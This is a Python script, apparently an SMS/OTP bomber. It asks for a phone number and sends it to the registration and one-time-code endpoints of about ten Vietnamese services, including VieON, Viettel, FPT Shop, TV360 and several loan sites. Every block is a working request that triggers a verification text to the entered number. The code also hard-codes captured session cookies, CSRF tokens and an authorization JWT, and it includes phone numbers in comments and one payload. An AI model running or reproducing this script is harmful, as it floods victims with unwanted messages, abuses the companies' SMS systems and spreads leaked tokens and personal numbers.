import requests ,time
sms = input("nhập sms:")


headers = {
    'authority': 'api.vieon.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODQxNTY0OTMsImp0aSI6IjgxZTQxYzUxODEwNmRkZTgwZmE3NGFjNDdkODA4NzdmIiwiYXVkIjoiIiwiaWF0IjoxNjgxNTY0NDkzLCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY4MTU2NDQ5Miwic3ViIjoiYW5vbnltb3VzXzYwOTZlMGI1YTNkNWYxOTc4MWYyMWU2OTk1M2VmZDAxLTJlMTlmNTEyNDRjMzZjNTY1NTU1NzRlMzI0MmVjNjRhLTE2ODE1NjQ0OTMiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiNjA5NmUwYjVhM2Q1ZjE5NzgxZjIxZTY5OTUzZWZkMDEtMmUxOWY1MTI0NGMzNmM1NjU1NTU3NGUzMjQyZWM2NGEtMTY4MTU2NDQ5MyIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzOyBTTS1BMjI1RikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMS4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsImR0IjoibW9iaWxlX3dlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiQW5kcm9pZCAxMyIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.soFjRAZLzloCY0xaM7RsN43pO92oK1s9i1L2yjX3JvE',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://vieon.vn',
    'referer': 'https://vieon.vn/',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
}

params = {
    'platform': 'mobile_web',
    'ui': '012021',
}

data = {
    'phone_number': sms,
    'password': 'e4s3ss3z',
    'given_name': '',
    'device_id': '6096e0b5a3d5f19781f21e69953efd01',
    'platform': 'mobile_web',
    'model': 'Android 13',
    'push_token': '',
    'device_name': 'Chrome/111',
    'device_type': 'desktop',
    'isMorePlatform': 'true',
    'ui': '012021',
}

response = requests.post('https://api.vieon.vn/backend/user/register/mobile', params=params, headers=headers, data=data)
 


cookies = {
    'laravel_session': 'fugMspa6eMRCXuzjXM3Xc5L9o3Wtahh7Ytv1J7L2',
    '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWkWV-cYLD9YooC-wUFNWAABO6seu1U18aYZREd.1',
    'redirectLogin': 'https://viettel.vn/quen-mat-khau',
    'XSRF-TOKEN': 'eyJpdiI6IkVWb2p1bDNsVHZPeXJtaHVGZzZUSGc9PSIsInZhbHVlIjoiSEFabWs2TitRdkVHMFMyTXhrUTdTUmdxM1dKNFhPakVwdTFiZnBnUXZlazlYS25DcVwvOThKNldVXC93UTFXUUMxIiwibWFjIjoiZjE4MmQ2ZDQ4NDNjMGFmOWJhOTAyMzk4NGFjNDZlOWRmY2I2MzM2NzFiYzIzMzAyNTIzNGIzZGY5MWRlNmVhNiJ9',
}

headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    # 'Cookie': 'laravel_session=fugMspa6eMRCXuzjXM3Xc5L9o3Wtahh7Ytv1J7L2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWkWV-cYLD9YooC-wUFNWAABO6seu1U18aYZREd.1; redirectLogin=https://viettel.vn/quen-mat-khau; XSRF-TOKEN=eyJpdiI6IkVWb2p1bDNsVHZPeXJtaHVGZzZUSGc9PSIsInZhbHVlIjoiSEFabWs2TitRdkVHMFMyTXhrUTdTUmdxM1dKNFhPakVwdTFiZnBnUXZlazlYS25DcVwvOThKNldVXC93UTFXUUMxIiwibWFjIjoiZjE4MmQ2ZDQ4NDNjMGFmOWJhOTAyMzk4NGFjNDZlOWRmY2I2MzM2NzFiYzIzMzAyNTIzNGIzZGY5MWRlNmVhNiJ9',
    'Origin': 'https://viettel.vn',
    'Referer': 'https://viettel.vn/quen-mat-khau',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
    'X-CSRF-TOKEN': 'spsiHJeGqSDyw3wD2lFc7nrG2D9UcZnktM5CFKmo',
    'X-Requested-With': 'XMLHttpRequest',
    'X-XSRF-TOKEN': 'eyJpdiI6IkVWb2p1bDNsVHZPeXJtaHVGZzZUSGc9PSIsInZhbHVlIjoiSEFabWs2TitRdkVHMFMyTXhrUTdTUmdxM1dKNFhPakVwdTFiZnBnUXZlazlYS25DcVwvOThKNldVXC93UTFXUUMxIiwibWFjIjoiZjE4MmQ2ZDQ4NDNjMGFmOWJhOTAyMzk4NGFjNDZlOWRmY2I2MzM2NzFiYzIzMzAyNTIzNGIzZGY5MWRlNmVhNiJ9',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

json_data = {
    'msisdn': sms,
}
response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
 

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"msisdn":"0378570289"}'
#response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, data=data)



cookies = {
    'vMobile': '2',
    'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '83f976ea-0de7-43b7-9208-9084626e0088',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'vMobile=2; log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=83f976ea-0de7-43b7-9208-9084626e0088',
    'Origin': 'https://fptshop.com.vn',
    'Referer': 'https://fptshop.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

data = {
    'phone': sms,
}
response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
 

cookies = {
    'SESSION': 'NmZiNTlhOWEtMTFjZS00NWJlLTljMDEtODJhODIzOGU2NzIx',
    'DESIGN_TYPE': 'NEW',
    '_fw_crm_v': 'f375ac79-0b6c-43a1-eb49-f613b6995cc1',
}

headers = {
    'authority': 'atmonline.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'content-type': 'application/json',
    # 'cookie': 'SESSION=NmZiNTlhOWEtMTFjZS00NWJlLTljMDEtODJhODIzOGU2NzIx; DESIGN_TYPE=NEW; _fw_crm_v=f375ac79-0b6c-43a1-eb49-f613b6995cc1',
    'origin': 'https://atmonline.vn',
    'referer': 'https://atmonline.vn/portal-new/login?mobilePhone=0358839176',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
}

json_data = {
    'mobilePhone': sms,
    'source': 'ONLINE',
}
response = requests.post(
    'https://atmonline.vn/back-office/api/json/auth/sendAcceptanceCode',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
 
# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"mobilePhone":"0358839176","source":"ONLINE"}'
#response = requests.post(
#    'https://atmonline.vn/back-office/api/json/auth/sendAcceptanceCode',
#    cookies=cookies,
#    headers=headers,
#    data=data,
#)
cookies = {
    'acw_tc': 'bdb6ae7415e3e527af1065f99f2c23077004f1dde40cf92785d9f5f1ada504e3',
    'img-ext': 'avif',
    'device-id': 's%3Awap_d796b2a4-ed6b-4342-86f7-5ac10c089528.6xkiWeKWYVfrRHJcL7fWpPj3%2B7whK9JYM5M4XQi6z4g',
    'shared-device-id': 'wap_d796b2a4-ed6b-4342-86f7-5ac10c089528',
    'screen-size': 's%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0',
    'G_ENABLED_IDPS': 'google',
    'session-id': 's%3Af6bdc077-149f-46fd-9c61-d3d3b9e00743.LgQIu3sT4zTsWQ3uti7Rnp5fFU9LYwjQi6oONd8Wp8w',
}

headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'acw_tc=bdb6ae7415e3e527af1065f99f2c23077004f1dde40cf92785d9f5f1ada504e3; img-ext=avif; device-id=s%3Awap_d796b2a4-ed6b-4342-86f7-5ac10c089528.6xkiWeKWYVfrRHJcL7fWpPj3%2B7whK9JYM5M4XQi6z4g; shared-device-id=wap_d796b2a4-ed6b-4342-86f7-5ac10c089528; screen-size=s%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0; G_ENABLED_IDPS=google; session-id=s%3Af6bdc077-149f-46fd-9c61-d3d3b9e00743.LgQIu3sT4zTsWQ3uti7Rnp5fFU9LYwjQi6oONd8Wp8w',
    'Origin': 'http://m.tv360.vn',
    'Referer': 'http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
}

json_data = {
    'msisdn': sms,
}
response = requests.post(
    'http://m.tv360.vn/public/v1/auth/get-otp-login',
    cookies=cookies,
    headers=headers,
    json=json_data,
    verify=False,
)
 
# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"msisdn":"0358839176"}'
#response = requests.post('http://m.tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, data=data, verify=False)

 

headers = {
    'authority': 'api.tamo.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://www.tamo.vn',
    'referer': 'https://www.tamo.vn/',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
}

json_data = {
    'mobilePhone': {
        'number': sms,
    },
}
response = requests.post('https://api.tamo.vn/web/public/client/phone/sms-code-ts', headers=headers, json=json_data)
 

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"mobilePhone":{"number":"0378570289"}}'
#response = requests.post('https://api.tamo.vn/web/public/client/phone/sms-code-ts', headers=headers, data=data)


headers = {
    'authority': 'api.dongplus.vn',
    'accept': '*/*',
    'accept-language': 'vi',
    'content-type': 'application/json',
    'origin': 'https://dongplus.vn',
    'referer': 'https://dongplus.vn/user/login',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
}

json_data = {
    'phone': sms,
}
response = requests.post('https://api.dongplus.vn/api/user/send-one-time-password', headers=headers, json=json_data)
 

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"phone":"84358839176"}'
#response = requests.post('https://api.dongplus.vn/api/user/send-one-time-password', headers=headers, data=data)


headers = {
    'authority': 'api.vayvnd.vn',
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'content-type': 'application/json; charset=UTF-8',
    'origin': 'https://new.vayvnd.vn',
    'referer': 'https://new.vayvnd.vn/',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'site-id': '3',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
}

json_data = {
    'tracking_id': 'fSdwmqsazWYbgWCSYVZ1rXkSzlBkBC9oNd6l82r4YjvfDc2PFwhhDVxLfeGnL5x8',
    'screen_resolution': {
        'width': 385,
        'height': 854,
    },
}
response = requests.post('https://api.vayvnd.vn/v2/track-sessions', headers=headers, json=json_data)
 

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"tracking_id":"fSdwmqsazWYbgWCSYVZ1rXkSzlBkBC9oNd6l82r4YjvfDc2PFwhhDVxLfeGnL5x8","screen_resolution":{"width":385,"height":854}}'
#response = requests.post('https://api.vayvnd.vn/v2/track-sessions', headers=headers, data=data)




cookies = {
    'OnCredit_id': '643d8607c6ffe8.92935100',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': 'o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=',
    'SN5c8116d5e6183': '73o3d6un8805a38svngt4caogi',
}

headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OnCredit_id=643d8607c6ffe8.92935100; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=; SN5c8116d5e6183=73o3d6un8805a38svngt4caogi',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'data[typeData]': 'sendCodeReg',
    'data[phone]': sms,
    'data[email]': 'tv5v4v4v4c@gmail.com',
    'data[captcha1]': '1',
    'data[lang]': 'vi',
    'CSRFName': 'CSRFGuard_ajax',
    'CSRFToken': '8a4QKZa9EFRSRQF6dKyk3dDZ56Fh9Y2YdRNEsnDRaASZ2fh6HbSEBDSAna7fknfD',
}
response = requests.post('https://oncredit.vn/?ajax', cookies=cookies, headers=headers, data=data)
 


headers = {
    'authority': 'app.tienoi.com.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://app.tienoi.com.vn',
    'referer': 'https://app.tienoi.com.vn/auth/registration?need=2000000&days=14',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
}

json_data = {
    'mobilePhone': '0358839176',
    'password': '14p22008A',
    'passwordConfirmation': '14p22008A',
    'isVoiceSms': True,
}
response = requests.post(
    'https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode',
    headers=headers,
    json=json_data,
)
 

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"mobilePhone":"0358839176","password":"14p22008A","passwordConfirmation":"14p22008A","isVoiceSms":true}'
#response = requests.post('https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode', headers=headers, data=data)